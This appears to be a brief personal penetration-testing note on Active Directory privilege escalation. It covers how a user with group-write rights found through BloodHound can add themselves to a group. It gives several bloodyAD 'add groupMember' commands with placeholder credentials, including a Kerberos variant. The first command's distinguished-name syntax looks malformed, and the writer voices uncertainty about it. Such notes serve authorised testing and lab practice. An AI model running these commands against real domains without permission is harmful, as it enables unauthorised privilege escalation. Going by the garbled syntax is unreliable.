Some users can add themselves to groups (check bloodhound)
![[../../assets/AddSelf/image 406.png|image 406.png]]
  
Need bloodyAD
https://github.com/CravateRouge/bloodyAD
  
![[../../assets/AddSelf/image 1 303.png|image 1 303.png]]
- python3 bloodyAD —host <dc01.domain> -d <DOMAIN> -u <user> -p <pass> -k add groupMember “CN=<GROUP>,CN=USERS,DC=<DOMAIN>DC=,<SUBDOMAIN> <user_to_add>
    
    - user_to_add in this case would be the same user since you are “adding self”
    
    - not sure if CN=USERS is needed
        
        - i think its like “i want to add this user to the USERS of GROUP
        
    
  
  
- if above doesn’t work, try this
bloodyAD --host ‘<IP>’ -d ‘<domain>’ -u ‘<user>’ -p ‘<pass>’ add groupMember ‘<group>’ ‘<user_to_add>’
- if you are authenticating with kerberos it will look something like this
    
    - bloodyAD --host ‘<hostname>’ -d ‘<domain>’ -u ‘<user>’ -p ‘<pass>’ -k add groupMember ‘<group>’ ‘<user_to_add>’
        
        - hostname is something like dc01.<domain>